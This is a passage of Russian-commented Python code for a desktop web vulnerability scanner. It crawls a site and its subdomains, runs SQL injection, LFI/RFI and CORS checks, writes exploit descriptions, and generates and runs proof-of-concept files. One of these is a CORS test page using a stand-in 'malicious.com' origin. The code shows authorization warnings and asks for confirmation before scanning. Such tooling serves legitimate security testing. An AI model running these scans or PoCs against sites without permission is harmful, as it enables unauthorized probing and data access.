            exploits.append({
                "vulnerability": vuln,
                "exploit": "Известные уязвимости старых версий.",
                "example": "Устаревший jQuery.",
                "poc": f"PoC: Используйте Retire.js для анализа библиотек на `{base_url}`.",
                "recommendation": "Обновите библиотеки."
            })

        elif "CORS" in vuln:
            poc_filename = f"{POC_DIR}/cors_poc_{index}_{netloc}_{timestamp}.html"
            poc_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CORS PoC</title>
    <script>
        function testCORS() {{
            fetch('{base_url}', {{ 
                method: 'GET',
                headers: {{ 'Origin': 'http://malicious.com' }}
            }})
            .then(response => response.text())
            .then(data => alert('CORS уязвимость подтверждена! Данные: ' + data.slice(0, 100)))
            .catch(err => alert('Ошибка: ' + err));
        }}
    </script>
</head>
<body>
    <h1>CORS Proof of Concept</h1>
    <p>Нажмите на кнопку, чтобы проверить CORS.</p>
    <button onclick="testCORS()">Test CORS</button>
</body>
</html>"""
            try:
                with open(poc_filename, 'w', encoding='utf-8') as f:
                    f.write(poc_content)
                poc_instructions = f"""PoC: {poc_filename}
Инструкции:
1. Откройте файл в браузере.
2. Нажмите кнопку "Тест CORS".
3. Если данные отображаются, уязвимость подтверждена."""
            except Exception as e:
                logger.error(f"Ошибка записи {poc_filename}: {str(e)}")
            exploits.append({
                "vulnerability": vuln,
                "exploit": "Доступ к данным с другого домена.",
                "example": "Запрос с malicious.com.",
                "poc": poc_instructions,
                "poc_file": poc_filename,
                "recommendation": "Ограничьте Access-Control-Allow-Origin."
            })

    logger.debug(f"Сгенерировано {len(exploits)} эксплойтов")
    return exploits


# Асинхронное сканирование страниц
async def scan_page(url, session, visited=None, depth=0, max_depth=2):
    if visited is None:
        visited = set()
    if url in visited or depth > max_depth:
        logger.debug(f"Пропуск {url}: уже посещен или превышен max_depth={max_depth}")
        return [], []
    visited.add(url)
    vulnerabilities = []
    logger.info(f"Сканирование {url} (глубина: {depth})")
    try:
        async with session.get(url, timeout=10) as response:
            if response.status != 200:
                logger.error(f"Ошибка доступа к {url}: HTTP {response.status}")
                return [f"Ошибка доступа к {url}: HTTP {response.status}"], []
            headers = dict(response.headers)
            content = await response.text()
            soup = BeautifulSoup(content, 'html.parser')

            vulnerabilities.extend(check_security_headers(headers))
            vulnerabilities.extend(check_cookies(response))
            vulnerabilities.extend(check_https(url))
            vulnerabilities.extend(await check_robots_sitemap(url, session))
            vulnerabilities.extend(await analyze_forms(soup, url, session))
            vulnerabilities.extend(await check_sql_injection(url, session))
            vulnerabilities.extend(await check_lfi_rfi(url, session))
            vulnerabilities.extend(ai_analyze_content(content, headers, soup, url))
            vulnerabilities.extend(analyze_javascript(soup, url))
            vulnerabilities.extend(check_server_config(headers))
            vulnerabilities.extend(await check_cors(url, session))

            links = []
            for a in soup.find_all('a', href=True):
                href = a['href']
                full_url = urljoin(url, href)
                parsed = urlparse(full_url)
                if parsed.netloc == urlparse(url).netloc and full_url not in visited:
                    links.append(full_url)
            for link in links[:5]:
                sub_vulns, _ = await scan_page(link, session, visited, depth + 1, max_depth)
                vulnerabilities.extend(sub_vulns)
    except Exception as e:
        vulnerabilities.append(f"Ошибка сканирования {url}: {str(e)}")
    return vulnerabilities, visited


# Основная функция сканирования
async def main(url):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    validation = validate_url(url)
    if validation is not True:
        return validation, [], {}

    vulnerabilities = []
    parsed = urlparse(url)
    domain = parsed.netloc

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=5)) as session:
        vulnerabilities, visited = await scan_page(url, session)
        subdomains = await find_subdomains(domain)
        for subdomain in subdomains[:3]:
            sub_url = f"http://{subdomain}"
            logger.info(f"Сканирование субдомена {sub_url}")
            sub_vulns, _ = await scan_page(sub_url, session, visited)
            vulnerabilities.extend(sub_vulns)

    vuln_log = f"Сканирование {url} ({timestamp})\n" + "\n".join(vulnerabilities)
    exploits = generate_exploits(vulnerabilities, url)
    exploits_text = "\n\n".join([
        f"Уязвимость: {e['vulnerability']}\nЭксплойт: {e['exploit']}\nПример: {e['example']}\n{e.get('poc', 'PoC не создан')}\nРекомендация: {e['recommendation']}"
        for e in exploits]) if exploits else ""

    report = {
        "url": url,
        "timestamp": timestamp,
        "vulnerabilities": vulnerabilities,
        "exploits": exploits
    }
    try:
        with open('vulnerabilities.log', 'w', encoding='utf-8') as f:
            f.write(vuln_log)
        with open('exploits.txt', 'w', encoding='utf-8') as f:
            f.write(exploits_text)
        with open('report.json', 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logger.error(f"Ошибка записи файлов: {str(e)}")

    return vulnerabilities, exploits, report


# Tkinter UI
class VulnerabilityScannerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Web Vulnerability Scanner")
        self.root.geometry("800x700")
        self.scanning = False

        tk.Label(
            root,
            text="ВНИМАНИЕ: Сканируйте только сайты, на которые у вас есть разрешение. Несанкционированное сканирование незаконно.",
            fg="red",
            wraplength=750,
            font=("Arial", 10, "bold")
        ).pack(pady=10)

        url_frame = tk.Frame(root)
        url_frame.pack(pady=5, padx=10, fill=tk.X)

        tk.Label(url_frame, text="URL для сканирования:").pack(side=tk.LEFT)
        self.url_entry = tk.Entry(url_frame, width=50)
        self.url_entry.pack(padx=5, pady=5, expand=True, fill=tk.X)

        self.scan_button = tk.Button(root, text="Начать сканирование", command=self.start_scan)
        self.scan_button.pack(pady=5)

        self.progress_label = tk.Label(root, text="")
        self.progress_label.pack(pady=5)
        self.progress_bar = ttk.Progressbar(root, mode='indeterminate', length=300)

        self.result_text = scrolledtext.ScrolledText(root, height=15, width=80, wrap=tk.WORD, state='disabled')
        self.result_text.pack(pady=10, padx=10)

        report_frame = tk.Frame(root)
        report_frame.pack(pady=5)

        tk.Button(report_frame, text="Открыть vulnerabilities.log",
                  command=lambda: self.open_file('vulnerabilities.log')).pack(side=tk.LEFT, padx=5)
        tk.Button(report_frame, text="Открыть exploits.txt", command=lambda: self.open_file('exploits.txt')).pack(
            side=tk.LEFT, padx=5)
        tk.Button(report_frame, text="Открыть report.json", command=lambda: self.open_file('report.json')).pack(
            side=tk.LEFT, padx=5)

        tk.Label(root, text="PoC файлы (дважды кликните для тестирования):").pack()
        self.poc_list = tk.Listbox(root, width=80, height=5)
        self.poc_list.pack(pady=5, padx=10)
        self.poc_list.bind('<Double-1>', self.open_selected_poc)

        tk.Label(root, text="Результаты тестирования PoC:").pack()
        self.poc_output_text = scrolledtext.ScrolledText(root, height=10, width=80, wrap=tk.WORD, state='disabled')
        self.poc_output_text.pack(pady=5, padx=10)

        self.exploits = []

    def open_file(self, filename):
        try:
            if os.path.exists(filename):
                if platform.system() == "Windows":
                    os.startfile(filename)
                else:
                    subprocess.run(["xdg-open", filename])
            else:
                messagebox.showerror("Ошибка", f"Файл {filename} не найден")
        except Exception as e:
            messagebox.showerror("Ошибка", f"Не удалось открыть файл: {str(e)}")

    def test_poc(self, poc_file):
        logger.debug(f"Тестирование PoC: {poc_file}")
        if not os.path.exists(poc_file) or not poc_file.startswith(POC_DIR):
            self.update_poc_output(f"Ошибка: PoC файл {poc_file} не найден или находится вне директории {POC_DIR}\n")
            logger.error(f"PoC файл {poc_file} не найден или недействителен")
            return

        if poc_file.endswith('.py'):
            try:
                with open(poc_file, 'r', encoding='utf-8') as f:
                    content = f.read()
                    if 'import requests' not in content:
                        self.update_poc_output(f"Ошибка: PoC файл {poc_file} не содержит 'import requests'\n")
                        logger.error(f"PoC {poc_file} не содержит 'import requests'")
                        return
            except Exception as e:
                self.update_poc_output(f"Ошибка чтения PoC файла {poc_file}: {str(e)}\n")
                logger.error(f"Ошибка чтения PoC {poc_file}: {str(e)}")
                return

        if not messagebox.askyesno(
                "Подтверждение",
                f"Вы собираетесь протестировать PoC: {poc_file}. Это может выполнить код или отправить запросы. "
                f"{'Для CSRF убедитесь, что вы вошли на сайте в браузере.' if 'csrf' in poc_file.lower() else ''} "
                "Убедитесь, что у вас есть разрешение. Продолжить?"
        ):
            self.update_poc_output("Тестирование PoC отменено пользователем\n")
            logger.info(f"Тестирование PoC {poc_file} отменено")
            return

        self.update_poc_output(f"Начало тестирования PoC: {poc_file}\n")
        logger.info(f"Запуск PoC: {poc_file}")

        try:
            if poc_file.endswith('.html'):
                webbrowser.open(f'file://{os.path.abspath(poc_file)}')
                self.update_poc_output(
                    f"PoC открыт в браузере. {'Убедитесь, что вы авторизованы на сайте, если тестируете CSRF.' if 'csrf' in poc_file.lower() else ''} "
                    "Нажмите кнопку в браузере и проверьте, изменилось ли состояние сайта.\n"
                )
                logger.info(f"HTML PoC {poc_file} открыт в браузере")
            elif poc_file.endswith('.py'):
                logger.debug(f"Запуск Python PoC: python {poc_file}")
                process = subprocess.run(
                    ['python', poc_file],
                    capture_output=True,
                    text=True,
                    timeout=15,
                    encoding='utf-8',
                    errors='replace'
                )
                stdout = process.stdout or ""
                stderr = process.stderr or ""
                output = stdout + stderr
                if output.strip():
                    self.update_poc_output(f"Вывод PoC:\n{output}\n")
                    logger.info(f"PoC {poc_file} выполнил вывод: {output[:100]}...")
                else:
                    self.update_poc_output(
                        "PoC не произвел вывода. Возможно, цель недоступна или скрипт завершился без результата.\n")
                    logger.warning(f"PoC {poc_file} не произвел вывода")
                if process.returncode != 0:
                    self.update_poc_output(f"PoC завершился с ошибкой (код возврата: {process.returncode})\n")
                    logger.error(f"PoC {poc_file} завершился с кодом возврата {process.returncode}")
            else:
                self.update_poc_output("Ошибка: Неизвестный тип PoC файла. Поддерживаются только .html и .py.\n")
                logger.error(f"Неизвестный тип PoC файла: {poc_file}")
        except Exception as e:
            self.update_poc_output(f"Ошибка при тестировании PoC: {str(e)}\n")
            logger.error(f"Ошибка выполнения PoC {poc_file}: {str(e)}")

    def update_poc_output(self, text):
        try:
            self.poc_output_text.config(state='normal')
            self.poc_output_text.insert(tk.END, text)
            self.poc_output_text.see(tk.END)
            self.poc_output_text.config(state='disabled')
            logger.debug(f"Обновлен вывод PoC в UI: {text[:50]}...")
        except Exception as e:
            logger.error(f"Ошибка обновления вывода PoC в UI: {str(e)}")
            messagebox.showerror("Ошибка UI", f"Не удалось обновить вывод PoC: {str(e)}")

    def open_selected_poc(self, event):
        try:
            selection = self.poc_list.curselection()
            if selection:
                poc_file = self.poc_list.get(selection[0])
                logger.debug(f"Двойной клик по PoC: {poc_file}")
                self.test_poc(poc_file)
            else:
                logger.warning("Двойной клик без выбранного PoC")
        except Exception as e:
            self.update_poc_output(f"Ошибка при выборе PoC: {str(e)}\n")
            logger.error(f"Ошибка в open_selected_poc: {str(e)}")

    def start_scan(self):
        if self.scanning:
            return

        url = self.url_entry.get().strip()
        if not url:
            messagebox.showerror("Ошибка", "Введите URL")
            return

        if not url.startswith(('http://', 'https://')):
            url = f"http://{url}"

        if not messagebox.askyesno("Подтверждение",
                                   f"Вы уверены, что хотите сканировать {url}? Убедитесь, что у вас есть разрешение."):
            return

        self.scanning = True
        self.scan_button.config(state='disabled')
        self.progress_label.config(text="Сканирование в процессе...")
        self.progress_bar.pack(pady=5)
        self.progress_bar.start()
        self.result_text.config(state='normal')
        self.result_text.delete(1.0, tk.END)
        self.result_text.config(state='disabled')
        self.poc_list.delete(0, tk.END)
        self.poc_output_text.config(state='normal')
        self.poc_output_text.delete(1.0, tk.END)
        self.poc_output_text.config(state='disabled')

        threading.Thread(target=self.run_scan, args=(url,), daemon=True).start()

    def run_scan(self, url):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            vuln_log, exploits, report = loop.run_until_complete(main(url))
            self.exploits = exploits
            self.root.after(0, self.update_ui, vuln_log, exploits, report)
        except Exception as e:
            self.root.after(0, self.show_error, str(e))
        finally:
            loop.close()

    def update_ui(self, vuln_log, exploits, report):
        try:
            self.scanning = False
            self.scan_button.config(state='normal')
            self.progress_label.config(text="Сканирование завершено")
            self.progress_bar.stop()
            self.progress_bar.pack_forget()

            self.result_text.config(state='normal')
            self.result_text.insert(tk.END, f"URL: {report['url']}\n")
            self.result_text.insert(tk.END, f"Время: {report['timestamp']}\n\n")

            self.result_text.insert(tk.END, "Уязвимости:\n")
            if report['vulnerabilities']:
                for vuln in report['vulnerabilities']:
                    self.result_text.insert(tk.END, f"- {vuln}\n")
                    if "Random Forest" in vuln or "BERT" in vuln:
                        self.result_text.insert(tk.END, f"  [AI Analysis]: {vuln}\n")
            else:
                self.result_text.insert(tk.END, "Уязвимости не обнаружены\n")

            self.result_text.insert(tk.END, "\nЭксплойты и PoC:\n")
            if exploits:
                for exploit in exploits:
                    self.result_text.insert(tk.END, f"Уязвимость: {exploit['vulnerability']}\n")
                    self.result_text.insert(tk.END, f"Эксплойт: {exploit['exploit']}\n")
                    self.result_text.insert(tk.END, f"Пример: {exploit['example']}\n")
                    self.result_text.insert(tk.END, f"PoC: {exploit.get('poc', 'PoC не создан')}\n")
                    self.result_text.insert(tk.END, f"Рекомендация: {exploit['recommendation']}\n\n")
                    if exploit.get('poc_file'):
                        self.poc_list.insert(tk.END, exploit['poc_file'])
            else:
                self.result_text.insert(tk.END, "Эксплойты не созданы\n")

            self.result_text.config(state='disabled')
        except Exception as e:
            logger.error(f"Ошибка обновления UI: {str(e)}")
            messagebox.showerror("Ошибка UI", f"Не удалось обновить интерфейс: {str(e)}")

    def show_error(self, error):
        self.scanning = False
        self.scan_button.config(state='normal')
        self.progress_label.config(text="")
        self.progress_bar.stop()
        self.progress_bar.pack_forget()
        messagebox.showerror("Ошибка", f"Ошибка сканирования: {error}")


if __name__ == "__main__":
    root = tk.Tk()
    app = VulnerabilityScannerApp(root)
    root.mainloop()